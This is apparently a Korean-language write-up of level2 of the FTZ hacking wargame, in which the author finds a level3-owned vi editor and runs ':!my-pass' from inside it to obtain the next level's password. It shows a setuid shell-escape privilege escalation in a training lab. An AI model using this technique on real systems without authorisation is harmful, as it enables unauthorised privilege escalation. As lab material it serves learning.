@@ -1,0 +1,100 @@
+I"<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level2 
+level2@~~~~<span class="s1">'s password: 
+[level2@ftz level2]$
+</span></code></pre></div></div>
+
+<p>level2/hacker or cracker로 접속하자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level2@ftz level2]<span class="nv">$ </span><span class="nb">ls 
+</span>hint  public_html  tmp 
+<span class="o">[</span>level2@ftz level2]<span class="nv">$ </span><span class="nb">cat </span>hint 
+</code></pre></div></div>
+
+<p>텍스트 파일 편집 중 쉘의 명령을 실행시킬 수 있다는데…</p>
+
+<p>바로 hint를 읽었다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level2@ftz level2]<span class="nv">$ </span>find / <span class="nt">-user</span> level3 2&gt; /dev/null 
+/usr/bin/editor 
+<span class="o">[</span>level2@ftz level2]<span class="err">$</span>
+</code></pre></div></div>
+
+<p>find 함수로 level3의 권한을 가진 파일을 읽었다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level2@ftz level2]<span class="nv">$ </span><span class="nb">cd</span> /usr/bin 
+<span class="o">[</span>level2@ftz bin]<span class="nv">$ </span>./editor
+
+
+
+
+
+~                              VIM - Vi IMproved 
+~ 
+~                               version 6.1.320 
+~                           by Bram Moolenaar et al. 
+~                 Vim is open <span class="nb">source </span>and freely distributable 
+~ 
+~                        Help poor children <span class="k">in </span>Uganda! 
+~                <span class="nb">type</span>  :help iccf       <span class="k">for </span>information 
+~ 
+~                <span class="nb">type</span>  :q               to exi
+~                <span class="nb">type</span>  :help  or    <span class="k">for </span>on-line <span class="nb">help</span> 
+~                <span class="nb">type</span>  :help version6   <span class="k">for </span>version info 
+
+~
+
+</code></pre></div></div>
+
+<p>vi 편집기가 실행되었다. vi편집기는 리눅스 환경에서 코딩을 할 때 자주 사용하는 편집기이다. 이 vi편집기의 특이한 점은, 편집기에서 리눅스 명령어를 실행시킬 수 있다는 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~                              VIM - Vi IMproved 
+~ 
+~                               version 6.1.320 
+~                           by Bram Moolenaar et al. 
+~                 Vim is open <span class="nb">source </span>and freely distributable 
+~ 
+~                        Help poor children <span class="k">in </span>Uganda! 
+~                <span class="nb">type</span>  :help iccf       <span class="k">for </span>information 
+~
+~                <span class="nb">type</span>  :q               to <span class="nb">exit</span> 
+~                <span class="nb">type</span>  :help  or    <span class="k">for </span>on-line <span class="nb">help</span> 
+~                <span class="nb">type</span>  :help version6   <span class="k">for </span>version info 
+~ 
+~ 
+~ 
+~ 
+~ 
+
+:!my-pass
+
+</code></pre></div></div>
+
+<p>이 프로그램은 level3의 권한을 가지고 있으므로, my-pass를 실행시키면 level3의 답을 알아낼 수 있을 것이다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ESC!my-pass
+
+</code></pre></div></div>
+
+<p>여기서 !는 이 뒤의 명령어를 실행한다는 의미를 가지고 있다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Level3 Password is <span class="s2">"can you fly?"</span><span class="nb">.</span> 
+
+
+
+
+
+shell returned 37 
+
+
+
+Hit ENTER or <span class="nb">type command </span>to <span class="k">continue</span>
+
+</code></pre></div></div>
+
+<p>level3의 정답이 나왔다.</p>
+
+<p>level3’s passworld:”can you fly?”</p>
+
+:ET
